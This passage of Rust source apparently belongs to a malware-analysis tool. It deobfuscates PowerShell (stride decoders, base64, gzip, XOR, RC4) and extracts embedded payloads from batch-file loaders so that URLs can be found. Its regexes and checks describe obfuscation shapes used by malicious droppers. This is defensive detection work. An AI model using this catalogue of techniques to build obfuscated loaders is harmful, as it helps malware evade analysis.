        let Some((literal_end, value)) = parse_ps_single_quoted_literal(text, pos) else {
            search_from = end_name;
            continue;
        };
        let mut call_end = literal_end;
        if parenthesized {
            let after = skip_ascii_ws(bytes, call_end);
            if bytes.get(after) != Some(&b')') {
                search_from = end_name;
                continue;
            }
            call_end = after + 1;
        }
        matches.push((start, call_end, value));
        search_from = call_end;
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn is_ident_byte(byte: Option<u8>) -> bool {
    byte.is_some_and(|b| b.is_ascii_alphanumeric() || b == b'_')
}

fn skip_ascii_ws(bytes: &[u8], mut pos: usize) -> usize {
    while bytes.get(pos).is_some_and(|b| b.is_ascii_whitespace()) {
        pos += 1;
    }
    pos
}

fn next_char_at(text: &str, pos: usize) -> Option<(char, usize)> {
    let byte = *text.as_bytes().get(pos)?;
    if byte.is_ascii() {
        Some((byte as char, 1))
    } else {
        let ch = text[pos..].chars().next()?;
        Some((ch, ch.len_utf8()))
    }
}

fn parse_ps_single_quoted_literal(text: &str, start: usize) -> Option<(usize, String)> {
    let bytes = text.as_bytes();
    if bytes.get(start).copied() != Some(b'\'') {
        return None;
    }
    let mut pos = start + 1;
    let mut out = String::new();
    while pos < bytes.len() {
        let byte = bytes[pos];
        if byte == b'\'' {
            if bytes.get(pos + 1).copied() == Some(b'\'') {
                out.push('\'');
                pos += 2;
                continue;
            }
            return Some((pos + 1, out));
        }
        if byte.is_ascii() {
            out.push(byte as char);
            pos += 1;
            continue;
        }
        let (ch, ch_len) = next_char_at(text, pos)?;
        out.push(ch);
        pos += ch_len;
    }
    None
}

#[allow(clippy::expect_used)]
static SKIP_NTH_FOR_SUBSTRING_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+(\w+)\s*\([^)]*\)\s*\{[^{}]*?for\s*\(\s*\$(\w+)\s*=\s*(\d+)\s*;[^;]*?;\s*\$(\w+)\s*\+=\s*(\d+)\s*\)\s*\{[^{}]*?\.\s*'su'\s*\.\s*'Invoke'\s*\(\s*\$(\w+)\s*,"#,
    )
    .expect("skip-nth for substring def")
});

// Musculos-style `do { $acc += $param[$idx]; $idx += STEP } until (!$param[$idx])`
// stride decoder. Same call shape as SKIP_NTH_FOR_SUBSTRING (NAME 'carrier'), but
// the function body uses do/until instead of for. Captures: 1=function name,
// 2=index-var (init), 3=start, 4=index-var (increment) — must equal 2,
// 5=step.
#[allow(clippy::expect_used)]
static MUSCULOS_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+(\w+)\s*\([^)]*\)\s*\{\s*\$(\w+)\s*=\s*(\d+)\s*;\s*do\s*\{[^{}]*?\$\w+\s*\+=\s*\$\w+\[\s*\$\w+\s*\][^{}]*?\$(\w+)\s*\+=\s*(\d+)[^{}]*?\}\s*until\s*\(\s*!\s*\$\w+\[\s*\$\w+\s*\]\s*\)"#,
    )
    .expect("musculos stride def")
});

// For-loop stride decoders that append direct index reads:
// `for($i=4; $i -lt $s.Length; $i+=5) { $out += $s[$i] }`.
#[allow(clippy::expect_used)]
static FOR_INDEX_STRIDE_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+(\w+)\s*\(\s*\$(\w+)[^)]*\)\s*\{.{0,4096}?for\s*\(\s*\$(\w+)\s*=\s*(\d+)\s*;[^;]{0,1024}?;\s*\$(\w+)\s*\+=\s*(\d+)\s*\)\s*\{.{0,2048}?\$\w+\s*\+=\s*\$(\w+)\s*\[\s*\$(\w+)\s*\]"#,
    )
    .expect("for index stride def")
});

// For-loop stride decoders that call Substring through a literal or variable:
// `$out += $s.$method.Invoke($i, 1)`.
#[allow(clippy::expect_used)]
static FOR_SUBSTRING_INVOKE_STRIDE_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+(\w+)\s*\(\s*\$(\w+)[^)]*\)\s*\{.{0,4096}?for\s*\(\s*\$(\w+)\s*=\s*(\d+)\s*;[^;]{0,1024}?;\s*\$(\w+)\s*\+=\s*\(?\s*(\d+)\s*\)?\s*\)\s*\{.{0,2048}?\$\w+\s*\+=\s*\$(\w+)\s*\.\s*(?:'([^']+)'|\$([A-Za-z_][A-Za-z0-9_]*))\s*\.Invoke\s*\(\s*\$(\w+)\s*,"#,
    )
    .expect("for substring invoke stride def")
});

fn contains_skip_nth_for_substring_shape(text: &str) -> bool {
    if !contains_ascii_case_insensitive(text, "for(") {
        return false;
    }
    contains_ascii_case_insensitive(text, "invoke")
        || contains_ascii_case_insensitive(text, "[$")
        || contains_ascii_case_insensitive(text, "until(")
}

fn expand_skip_nth(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "function")
        && !contains_ascii_case_insensitive(text, "-n")
        && !contains_ascii_case_insensitive(text, "-name")
    {
        return text.to_string();
    }
    let mut out = text.to_string();
    // Collect all function definitions with their skip parameters
    let defs: Vec<(String, usize, usize)> = SKIP_NTH_DEF_RE
        .captures_iter(text)
        .filter_map(|caps| {
            // fn name: group 1 (function NAME) or group 2 (-n NAME)
            let fn_name = caps
                .get(1)
                .or_else(|| caps.get(2))
                .map(|m| m.as_str().to_string())?;
            // body: group 3
            let body = caps.get(3)?.as_str();
            // step: group 5 (the $idx += N value)
            let step: usize = caps.get(5)?.as_str().parse().ok()?;
            if step == 0 || step > 10 {
                return None;
            }
            // Find start index: look for $VAR = N initializer in the body
            // The init variable should match the step variable (group 4)
            let idx_var = caps.get(4)?.as_str();
            let start: usize = SKIP_NTH_INIT_RE
                .captures_iter(body)
                .find(|c| c.get(1).map(|m| m.as_str()) == Some(idx_var))
                .and_then(|c| c.get(2)?.as_str().parse().ok())
                .unwrap_or(1);
            if start > 10 {
                return None;
            }
            Some((fn_name, start, step))
        })
        .collect();

    for (name, start, step) in defs {
        // Find call sites: NAME 'carrier' / NAME "carrier" / NAME('carrier')
        // / NAME ( "carrier" ). The leading `(?:^|[^\w])` is a manual word
        // boundary that prevents `BarFoo('x')` from matching when the
        // function name is `Foo` — `\b` alone would happily anchor at the
        // `F` inside `BarFoo`. Carrier minimum length 4: at start≥1 step≥1
        // a 1-3 char carrier almost never decodes to a meaningful token,
        // and lower limits invited false rewrites on unrelated literals.
        let call_re_str = format!(
            r#"(?i)(?:^|[^\w]){}\s*\(?\s*['"]([^'"{{}}]{{4,2048}})['"]\s*\)?"#,
            regex::escape(&name)
        );
        let Ok(call_re) = regex::Regex::new(&call_re_str) else {
            continue;
        };
        let call_matches: Vec<(usize, usize, String)> = call_re
            .captures_iter(&out)
            .filter_map(|cc| {
                let full = cc.get(0)?;
                let carrier = cc.get(1)?.as_str();
                // The `(?:^|[^\w])` prefix consumes a delimiter char (when
                // not at line start) that's NOT part of the call we want to
                // rewrite. Keep that char in the output so the surrounding
                // token / line structure isn't damaged.
                let raw_match = full.as_str();
                let name_start = raw_match
                    .find(|c: char| c.is_alphanumeric() || c == '_')
                    .unwrap_or(0);
                let prefix = &raw_match[..name_start];

                let decoded = decode_strided_carrier(carrier, start, step);
                if decoded.is_empty() {
                    return None;
                }
                let replacement = format!("{}'{}'", prefix, decoded.replace('\'', ""));
                Some((full.start(), full.end(), replacement))
            })
            .collect();
        for (start_pos, end_pos, replacement) in call_matches.into_iter().rev() {
            out.replace_range(start_pos..end_pos, &replacement);
        }
    }
    out
}

#[cfg(test)]
mod skip_nth_prefilter_tests {
    use super::expand_skip_nth;

    #[test]
    fn ignores_text_without_skip_nth_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_skip_nth(text), text);
    }
}

fn expand_skip_nth_for_substring(text: &str) -> String {
    if !contains_skip_nth_for_substring_shape(text) {
        return text.to_string();
    }
    let mut out = text.to_string();
    let mut defs: Vec<(String, usize, usize)> = SKIP_NTH_FOR_SUBSTRING_DEF_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let name = caps.get(1)?.as_str().to_string();
            let init_var = caps.get(2)?.as_str();
            let step_var = caps.get(4)?.as_str();
            let invoke_var = caps.get(6)?.as_str();
            if !init_var.eq_ignore_ascii_case(step_var)
                || !init_var.eq_ignore_ascii_case(invoke_var)
            {
                return None;
            }
            let start: usize = caps.get(3)?.as_str().parse().ok()?;
            let step: usize = caps.get(5)?.as_str().parse().ok()?;
            if start > 10 || step == 0 || step > 10 {
                return None;
            }
            Some((name, start, step))
        })
        .collect();
    // Musculos-style do/until variants. Same (start, step) carrier semantics.
    defs.extend(MUSCULOS_DEF_RE.captures_iter(text).filter_map(|caps| {
        let name = caps.get(1)?.as_str().to_string();
        let init_var = caps.get(2)?.as_str();
        let inc_var = caps.get(4)?.as_str();
        if !init_var.eq_ignore_ascii_case(inc_var) {
            return None;
        }
        let start: usize = caps.get(3)?.as_str().parse().ok()?;
        let step: usize = caps.get(5)?.as_str().parse().ok()?;
        if start > 10 || step == 0 || step > 10 {
            return None;
        }
        Some((name, start, step))
    }));
    defs.extend(
        FOR_INDEX_STRIDE_DEF_RE
            .captures_iter(text)
            .filter_map(|caps| {
                let name = caps.get(1)?.as_str().to_string();
                let param_var = caps.get(2)?.as_str();
                let init_var = caps.get(3)?.as_str();
                let inc_var = caps.get(5)?.as_str();
                let body_param = caps.get(7)?.as_str();
                let body_idx = caps.get(8)?.as_str();
                if !init_var.eq_ignore_ascii_case(inc_var)
                    || !init_var.eq_ignore_ascii_case(body_idx)
                    || !param_var.eq_ignore_ascii_case(body_param)
                {
                    return None;
                }
                let start: usize = caps.get(4)?.as_str().parse().ok()?;
                let step: usize = caps.get(6)?.as_str().parse().ok()?;
                if start > 10 || step == 0 || step > 10 {
                    return None;
                }
                Some((name, start, step))
            }),
    );
    let bindings = ps_string_bindings(text);
    defs.extend(
        FOR_SUBSTRING_INVOKE_STRIDE_DEF_RE
            .captures_iter(text)
            .filter_map(|caps| {
                let name = caps.get(1)?.as_str().to_string();
                let param_var = caps.get(2)?.as_str();
                let init_var = caps.get(3)?.as_str();
                let inc_var = caps.get(5)?.as_str();
                let body_param = caps.get(7)?.as_str();
                let body_idx = caps.get(10)?.as_str();
                if !init_var.eq_ignore_ascii_case(inc_var)
                    || !init_var.eq_ignore_ascii_case(body_idx)
                    || !param_var.eq_ignore_ascii_case(body_param)
                {
                    return None;
                }
                let method = caps.get(8).map(|m| m.as_str().to_string()).or_else(|| {
                    caps.get(9)
                        .and_then(|m| bindings.get(&m.as_str().to_ascii_lowercase()).cloned())
                })?;
                if !method.eq_ignore_ascii_case("substring") {
                    return None;
                }
                let start: usize = caps.get(4)?.as_str().parse().ok()?;
                let step: usize = caps.get(6)?.as_str().parse().ok()?;
                if start > 10 || step == 0 || step > 10 {
                    return None;
                }
                Some((name, start, step))
            }),
    );

    for (name, start, step) in defs {
        // Accept both NAME 'carrier' and NAME('carrier') / NAME ( 'carrier' ).
        // Manual word boundary `(?:^|[^\w])` so `Foo` doesn't match inside
        // `MyFoo('xy')`. Carrier excludes `{` `}` to avoid greedily eating
        // body-literal braces from an unrelated PS function body.
        let call_re_str = format!(
            r#"(?i)(?:^|[^\w]){}\s*\(?\s*['"]([^'"{{}}]{{6,8192}})['"]\s*\)?"#,
            regex::escape(&name)
        );
        let Ok(call_re) = regex::Regex::new(&call_re_str) else {
            continue;
        };
        let call_matches: Vec<(usize, usize, String)> = call_re
            .captures_iter(&out)
            .filter_map(|cc| {
                let full = cc.get(0)?;
                let carrier = cc.get(1)?.as_str();
                let raw_match = full.as_str();
                let name_start = raw_match
                    .find(|c: char| c.is_alphanumeric() || c == '_')
                    .unwrap_or(0);
                let prefix = &raw_match[..name_start];
                let decoded = decode_strided_carrier(carrier, start, step);
                if decoded.len() < 3 {
                    return None;
                }
                Some((
                    full.start(),
                    full.end(),
                    format!("{}'{}'", prefix, decoded.replace('\'', "")),
                ))
            })
            .collect();
        for (start_pos, end_pos, replacement) in call_matches.into_iter().rev() {
            out.replace_range(start_pos..end_pos, &replacement);
        }
    }

    out
}

fn decode_strided_carrier(carrier: &str, start: usize, step: usize) -> String {
    if carrier.is_ascii() {
        let bytes = carrier.as_bytes();
        let mut out = String::with_capacity(carrier.len() / step + 1);
        let mut i = start;
        while i < bytes.len() {
            out.push(bytes[i] as char);
            i = i.checked_add(step).unwrap_or(bytes.len());
        }
        return out;
    }

    let chars: Vec<char> = carrier.chars().collect();
    let mut out = String::with_capacity(chars.len() / step + 1);
    let mut i = start;
    while i < chars.len() {
        out.push(chars[i]);
        i = i.checked_add(step).unwrap_or(chars.len());
    }
    out
}

#[cfg(test)]
mod skip_nth_for_substring_prefilter_tests {
    use super::expand_skip_nth_for_substring;

    #[test]
    fn ignores_text_without_for_substring_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_skip_nth_for_substring(text), text);
    }
}

#[cfg(test)]
mod decode_strided_carrier_tests {
    use super::decode_strided_carrier;

    #[test]
    fn ascii_and_unicode_carriers_decode_the_same_way() {
        assert_eq!(decode_strided_carrier("a.b.c.d.e", 0, 2), "abcde");
        assert_eq!(decode_strided_carrier("a.β.c.δ.e", 0, 2), "aβcδe");
    }
}

// Matches `$NAME = @'\n...body...\n'@`. Captures: 1=var name, 2=body. The
// `'+` on each side accepts both the original form and the doubled-quote
// form that arises when the herestring is itself embedded inside a wrapping
// single-quoted PS literal (common after `[Convert]::FromBase64String('...')`
// inlining). The closing `'@` should be at column 0 in strict PS, but
// obfuscators often deviate, so we just require the marker pair.
#[allow(clippy::expect_used)]
static PS_HERESTRING_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?s)\$([A-Za-z_]\w*)\s*=\s*@'+\r?\n(.*?)\r?\n'+@"#).expect("ps herestring assign")
});

// `$DST = $SRC -replace 'NEEDLE', 'REPL'` — captures dst, src, needle, repl.
// Outer quote count is constrained to 1 or 2 so the matcher works both for
// the original form (`'a','b'`) and the doubled-quote form (`''a'','b''`)
// that arises when the chain is inlined inside a wrapping single-quoted PS
// literal. Inner pattern allows `''` as a single-quote escape but forbids
// `\n` so we never accidentally extend the match across a line.
#[allow(clippy::expect_used)]
static PS_VAR_REPLACE_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\$([A-Za-z_]\w*)\s*=\s*\$([A-Za-z_]\w*)\s*-replace\s*'{1,2}((?:[^'\\\n]|''|\\.)*?)'{1,2}\s*,\s*'{1,2}((?:[^'\\\n]|''|\\.)*?)'{1,2}"#,
    )
    .expect("ps var replace assign")
});

/// Pre-pass over a PowerShell text: expand common obfuscation patterns so that
/// subsequent URL-extraction regexes see literal strings.
fn expand_obfuscation(text: &str) -> String {
    let mut out = normalize_powershell_quotes(text);
    let mut skip_nth_for_substring_done = false;
    for _ in 0..8 {
        let before = out.clone();
        out = expand_start_process_argument_list(&out);
        out = expand_invoke_expression_wrappers(&out);
        out = expand_passthrough_call_wrappers(&out);
        out = expand_ps_dot_replace(&out);
        out = expand_ps_embedded_single_quote_assignments(&out);
        out = expand_doubled_quote_literals(&out);
        out = expand_skip_nth(&out); // skip-nth-char decoder (Pattern B)
        if !skip_nth_for_substring_done {
            let next = expand_skip_nth_for_substring(&out);
            skip_nth_for_substring_done = next != out;
            out = next;
        }
        out = expand_char_concat(&out);
        out = expand_char_literal_concat(&out);
        out = expand_string_join_char_arrays(&out);
        out = expand_unary_join_char_arrays(&out);
        out = expand_char_array_concat_chunks(&out);
        out = expand_char_array_chunks(&out); // char-array chunk decoder (Pattern D)
        out = expand_hex_split_char_loop(&out);
        out = expand_space_concat(&out); // space-separated string array (Pattern C)
        out = expand_string_concat(&out);
        out = expand_double_string_concat(&out);
        out = expand_format_literals(&out);
        out = expand_gzip_function_base64_variables(&out);
        out = expand_gzip_base64_literals(&out);
        out = expand_json_script_base64(&out);
        out = expand_regex_replace_base64_variables(&out);
        out = expand_regex_replace_calls(&out);
        out = expand_getstring_base64_variables(&out);
        out = expand_getstring_base64_literals(&out);
        out = expand_getstring_byte_arrays(&out);
        out = expand_string_join_char_arrays(&out);
        out = expand_unary_join_char_arrays(&out);
        out = expand_convert_frombase64_literals(&out);
        out = append_decoded_frombase64_literals(&out);
        out = append_decoded_rc4_wrappers(&out);
        out = expand_base64_literals(&out);
        out = expand_getstring_wrapper(&out);
        out = expand_reverse_string_slice_join(&out);
        out = expand_single_literal_join(&out);
        out = expand_tochararray_reverse_join(&out);
        out = expand_ps_join(&out);
        out = expand_ps_replace(&out);
        out = expand_ps_dot_replace(&out);
        out = expand_ps_index_concat_assignments(&out);
        out = expand_ps_variables(&out);
        out = expand_regex_replace_calls(&out);
        out = expand_getstring_base64_variables(&out);
        out = expand_getstring_base64_literals(&out);
        out = expand_getstring_byte_arrays(&out);
        out = expand_convert_frombase64_literals(&out);
        out = append_decoded_frombase64_literals(&out);
        out = append_decoded_rc4_wrappers(&out);
        out = expand_base64_literals(&out);
        out = expand_getstring_wrapper(&out);
        if out == before {
            break;
        }
    }
    out
}

fn normalize_powershell_quotes(text: &str) -> String {
    if !text
        .chars()
        .any(|c| matches!(c, '\u{2018}' | '\u{2019}' | '\u{201C}' | '\u{201D}'))
        && !text.contains("\\\"")
    {
        return text.to_string();
    }
    let normalized: String = text
        .chars()
        .map(|c| match c {
            '\u{2018}' | '\u{2019}' => '\'',
            '\u{201C}' | '\u{201D}' => '"',
            _ => c,
        })
        .collect();
    normalized.replace("\\\"", "\"")
}

fn strip_marker_noise(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for chunk in text.split_inclusive('\n') {
        let (line, newline) = match chunk.strip_suffix('\n') {
            Some(line) => (line, "\n"),
            None => (chunk, ""),
        };
        if should_skip_marker_noise_line(line) {
            out.push_str(line);
        } else {
            out.push_str(&strip_marker_noise_preserving_base64(line));
        }
        out.push_str(newline);
    }
    out
}

fn should_skip_marker_noise_line(text: &str) -> bool {
    contains_ascii_case_insensitive(text, ".replace(")
        || contains_ascii_case_insensitive(text, "::replace(")
        || contains_ascii_case_insensitive(text, "-replace")
        || contains_ascii_case_insensitive(text, "gzipstream")
        || contains_ascii_case_insensitive(text, "readtoend")
        || contains_ascii_case_insensitive(text, "function ")
        || contains_ascii_case_insensitive(text, "for(")
}

fn strip_marker_noise_preserving_base64(text: &str) -> String {
    let spans = crate::marker_noise::decodable_base64_spans(text);
    if spans.is_empty() {
        return crate::marker_noise::strip_line(text);
    }

    let mut out = String::with_capacity(text.len());
    let mut cursor = 0usize;
    for (start, end) in spans {
        if start > cursor {
            out.push_str(&crate::marker_noise::strip_line(&text[cursor..start]));
        }
        out.push_str(&text[start..end]);
        cursor = end;
    }
    if cursor < text.len() {
        out.push_str(&crate::marker_noise::strip_line(&text[cursor..]));
    }
    out
}

/// Decode a ps1 payload to a String, handling UTF-16LE (from -EncodedCommand).
///
/// Heuristic: if at least half the even-offset bytes are non-zero and at
/// least half the odd-offset bytes are zero, treat as UTF-16LE.
fn decode_payload(bytes: &[u8]) -> std::borrow::Cow<'_, str> {
    if bytes.len() >= 4 && is_utf16le(bytes) {
        let u16s: Vec<u16> = bytes
            .chunks_exact(2)
            .map(|b| u16::from_le_bytes([b[0], b[1]]))
            .collect();
        String::from_utf16_lossy(&u16s).into()
    } else {
        String::from_utf8_lossy(bytes)
    }
}

pub fn normalize_ps1_text(text: &str) -> String {
    let expanded = strip_marker_noise(&expand_obfuscation(&strip_marker_noise(text)));
    let aliased = crate::ps_alias::expand_aliases_if_ps(&expanded);
    escape_binary_controls(&aliased)
}

pub fn normalize_ps1_payload(bytes: &[u8]) -> String {
    let raw_text = decode_payload(bytes);
    normalize_ps1_text(&raw_text)
}

fn escape_binary_controls(text: &str) -> String {
    if !text
        .chars()
        .any(|c| c.is_control() && !matches!(c, '\r' | '\n' | '\t'))
    {
        return text.to_string();
    }

    let mut out = String::with_capacity(text.len());
    for c in text.chars() {
        if c.is_control() && !matches!(c, '\r' | '\n' | '\t') {
            use std::fmt::Write as _;
            let _ = write!(out, "\\x{:02X}", c as u32);
        } else {
            out.push(c);
        }
    }
    out
}

pub fn extract_self_embedded_ps1(env: &mut Environment, deobfuscated: &str) {
    let Some(input_bytes) = env.input_bytes.clone() else {
        return;
    };
    extract_sorted_comment_ps1(env, &input_bytes);

    let source = String::from_utf8_lossy(&input_bytes);
    let mut known: std::collections::HashSet<Vec<u8>> =
        env.all_extracted_ps1.iter().cloned().collect();
    let mut decoded_payloads = Vec::new();

    if looks_like_self_tail_base64_loader(deobfuscated) {
        for decoded in decode_large_base64_runs_from_source(&source) {
            if known.insert(decoded.clone()) {
                decoded_payloads.push(decoded);
            }
        }
    }

    if env.all_extracted_ps1.is_empty() && decoded_payloads.is_empty() {
        return;
    }

    let payloads = env.all_extracted_ps1.clone();

    for payload in payloads {
        let text = decode_payload(&payload);
        if looks_like_self_tail_base64_loader(&text) {
            for decoded in decode_large_base64_runs_from_source(&source) {
                if known.insert(decoded.clone()) {
                    decoded_payloads.push(decoded);
                }
            }
        }
        if !text.contains("%~f0") && !contains_ascii_case_insensitive(&text, "get-content") {
            continue;
        }
        for caps in SELF_B64_MATCH_RE.captures_iter(&text) {
            let Some(marker) = caps.get(1).map(|m| m.as_str()) else {
                continue;
            };
            for b64 in find_marker_base64_runs(&source, marker) {
                if b64.len() > 16 * 1024 * 1024 {
                    continue;
                }
                let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
                    continue;
                };
                if decoded.len() > 12 * 1024 * 1024 || !looks_like_powershell_payload(&decoded) {
                    continue;
                }
                if known.insert(decoded.clone()) {
                    decoded_payloads.push(decoded);
                }
            }
        }
    }

    env.all_extracted_ps1.extend(decoded_payloads);
    extract_file_backed_xor_ps1(env, deobfuscated);
}

fn looks_like_self_tail_base64_loader(text: &str) -> bool {
    contains_ascii_case_insensitive(text, "get-content")
        && contains_ascii_case_insensitive(text, "-raw")
        && contains_ascii_case_insensitive(text, "frombase64string")
}

fn decode_large_base64_runs_from_source(source: &str) -> Vec<Vec<u8>> {
    const MIN_B64_RUN: usize = 80;
    const MAX_B64_RUN: usize = 16 * 1024 * 1024;

    let bytes = source.as_bytes();
    let mut out = Vec::new();
    let mut start: Option<usize> = None;
    for (idx, &b) in bytes.iter().enumerate() {
        if b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=') {
            start.get_or_insert(idx);
            continue;
        }
        if let Some(s) = start.take() {
            maybe_decode_source_b64_run(source, s, idx, MIN_B64_RUN, MAX_B64_RUN, &mut out);
        }
    }
    if let Some(s) = start {
        maybe_decode_source_b64_run(source, s, source.len(), MIN_B64_RUN, MAX_B64_RUN, &mut out);
    }
    out
}

fn maybe_decode_source_b64_run(
    source: &str,
    start: usize,
    end: usize,
    min_len: usize,
    max_len: usize,
    out: &mut Vec<Vec<u8>>,
) {
    let len = end.saturating_sub(start);
    if !(min_len..=max_len).contains(&len) {
        return;
    }
    let run = &source[start..end];
    let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(run) else {
        return;
    };
    if decoded.len() > 12 * 1024 * 1024 || !looks_like_powershell_payload(&decoded) {
        return;
    }
    out.push(decoded);
}

fn extract_sorted_comment_ps1(env: &mut Environment, input_bytes: &[u8]) {
    let source = String::from_utf8_lossy(input_bytes);
    let lower = source.to_ascii_lowercase();
    if !lower.contains("sort-object")
        || !lower.contains("startswith(':: ")
        || !lower.contains("substring(0, 10)")
        || !lower.contains("substring(10)")
    {
        return;
    }

    let mut groups: std::collections::BTreeMap<String, Vec<(String, String)>> =
        std::collections::BTreeMap::new();
    for line in source.lines() {
        let Some(rest) = line.strip_prefix(":: ") else {
            continue;
        };
        if rest.len() < 12 {
            continue;
        }
        let (group, rest) = rest.split_at(2);
        let (order, chunk) = rest.split_at(10);
        if !group.bytes().all(|b| b.is_ascii_digit()) || !order.bytes().all(|b| b.is_ascii_digit())
        {
            continue;
        }
        groups
            .entry(group.to_string())
            .or_default()
            .push((order.to_string(), chunk.to_string()));
    }

    let mut known: std::collections::HashSet<Vec<u8>> =
        env.all_extracted_ps1.iter().cloned().collect();
    for (_group, mut chunks) in groups {
        chunks.sort_by(|a, b| a.0.cmp(&b.0));
        let joined: String = chunks.into_iter().map(|(_, chunk)| chunk).collect();
        if joined.len() > 8 * 1024 * 1024 {
            continue;
        }
        let payload = joined.replace("PATH", "%~f0").into_bytes();
        if !looks_like_powershell_payload(&payload) {
            continue;
        }
        if known.insert(payload.clone()) {
            env.all_extracted_ps1.push(payload);
        }
    }
}

fn extract_file_backed_xor_ps1(env: &mut Environment, deobfuscated: &str) {
    if env.all_extracted_ps1.is_empty() {
        return;
    }

    let payloads = env.all_extracted_ps1.clone();
    let mut known: std::collections::HashSet<Vec<u8>> =
        env.all_extracted_ps1.iter().cloned().collect();
    let mut decoded_payloads = Vec::new();

    for payload in payloads {
        let text = decode_payload(&payload);
        let lower = text.to_ascii_lowercase();
        if !lower.contains("frombase64string") || !lower.contains("-bxor") {
            continue;
        }

        for caps in FILE_B64_XOR_LOADER_RE.captures_iter(&text) {
            let Some(key_var) = caps.get(1).map(|m| m.as_str()) else {
                continue;
            };
            let Some(key) = caps.get(2).and_then(|m| m.as_str().parse::<u8>().ok()) else {
                continue;
            };
            let Some(data_var) = caps.get(3).map(|m| m.as_str()) else {
                continue;
            };
            let Some(path) = caps.get(4).map(|m| m.as_str()) else {
                continue;
            };
            let Some(from_b64_var) = caps.get(5).map(|m| m.as_str()) else {
                continue;
            };
            let Some(xor_key_var) = caps.get(6).map(|m| m.as_str()) else {
                continue;
            };
            if !data_var.eq_ignore_ascii_case(from_b64_var)
                || !key_var.eq_ignore_ascii_case(xor_key_var)
            {
                continue;
            }

            let Some(content) = filesystem_content_for_path(env, path)
                .or_else(|| grouped_echo_content_for_path(deobfuscated, path))
            else {
                continue;
            };
            if content.len() > 16 * 1024 * 1024 {
                continue;
            }
            let b64: String = content
                .iter()
                .copied()
                .filter(|b| b.is_ascii_alphanumeric() || matches!(*b, b'+' | b'/' | b'='))
                .map(char::from)
                .collect();
            if b64.len() < 16 {
                continue;
            }
            let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
                continue;
            };
            if decoded.len() > 12 * 1024 * 1024 {
                continue;
            }
            let xored: Vec<u8> = decoded.into_iter().map(|b| b ^ key).collect();
            if !looks_like_powershell_payload(&xored) {
                continue;
            }
            if known.insert(xored.clone()) {
                decoded_payloads.push(xored);
            }
        }
    }

    env.all_extracted_ps1.extend(decoded_payloads);
}

fn filesystem_content_for_path(env: &Environment, path: &str) -> Option<Vec<u8>> {
    let key = normalize_fs_lookup_path(path);
    env.modified_filesystem
        .iter()
        .find_map(|(candidate, entry)| {
            if normalize_fs_lookup_path(candidate) == key {
                fs_entry_content(entry)
            } else {
                None
            }
        })
}

fn grouped_echo_content_for_path(deobfuscated: &str, path: &str) -> Option<Vec<u8>> {
    let wanted = normalize_fs_lookup_path(path);
    let mut in_group = false;
    let mut chunks: Vec<String> = Vec::new();

    for line in deobfuscated.lines() {
        let trimmed = line.trim();
        if trimmed == "(" {
            in_group = true;
            chunks.clear();
            continue;
        }
        if !in_group {
            continue;
        }
        if let Some(target) = redirected_group_target(trimmed) {
            if normalize_fs_lookup_path(target) == wanted {
                let mut content = Vec::new();
                for chunk in chunks {
                    content.extend_from_slice(chunk.as_bytes());
                    content.extend_from_slice(b"\r\n");
                }
                return Some(content);
            }
            in_group = false;
            chunks.clear();
            continue;
        }
        if let Some(rest) = trimmed.strip_prefix("echo ") {
            chunks.push(rest.to_string());
        }
    }

    None
}

fn redirected_group_target(line: &str) -> Option<&str> {
    let rest = line
        .strip_prefix(")>>")
        .or_else(|| line.strip_prefix(")>"))?
        .trim();
    rest.trim_matches('"').split_ascii_whitespace().next()
}

fn fs_entry_content(entry: &FsEntry) -> Option<Vec<u8>> {
    match entry {
        FsEntry::Content { content, .. } | FsEntry::Decoded { content, .. } => {
            Some(content.clone())
        }
        FsEntry::Download { .. } | FsEntry::Copy { .. } => None,
    }
}

fn normalize_fs_lookup_path(path: &str) -> String {
    let path = path.trim_matches('"').trim_matches('\'');
    if path.is_ascii() {
        let mut out = String::with_capacity(path.len());
        let mut last_was_backslash = false;
        for &byte in path.as_bytes() {
            let c = if byte == b'/' {
                b'\\'
            } else {
                byte.to_ascii_lowercase()
            };
            if c == b'\\' {
                if !last_was_backslash {
                    out.push(c as char);
                }
                last_was_backslash = true;
            } else {
                out.push(c as char);
                last_was_backslash = false;
            }
        }
        return out;
    }

    let mut out = String::with_capacity(path.len());
    let mut last_was_backslash = false;
    for c in path.chars() {
        let c = if c == '/' {
            '\\'
        } else {
            c.to_ascii_lowercase()
        };
        if c == '\\' {
            if !last_was_backslash {
                out.push(c);
            }
            last_was_backslash = true;
        } else {
            out.push(c);
            last_was_backslash = false;
        }
    }
    out
}

#[cfg(test)]
mod fs_lookup_path_tests {
    use super::normalize_fs_lookup_path;

    #[test]
    fn normalize_fs_lookup_path_fast_paths_ascii_and_preserves_unicode() {
        assert_eq!(
            normalize_fs_lookup_path(r#""C:/Temp\\Foo.EXE""#),
            r"c:\temp\foo.exe"
        );
        assert_eq!(
            normalize_fs_lookup_path(r#""C:/Temp/पथ\File.TXT""#),
            r"c:\temp\पथ\file.txt"
        );
    }
}

fn find_marker_base64_runs(source: &str, marker: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut search_from = 0;
    while let Some(rel) = source[search_from..].find(marker) {
        let start = search_from + rel + marker.len();
        let rest = &source[start..];
        let b64_len = rest
            .bytes()
            .take_while(|b| b.is_ascii_alphanumeric() || matches!(*b, b'+' | b'/' | b'='))
            .count();
        if b64_len >= 32 {
            out.push(rest[..b64_len].to_string());
        }
        search_from = start.saturating_add(b64_len.max(1));
    }
    out
}

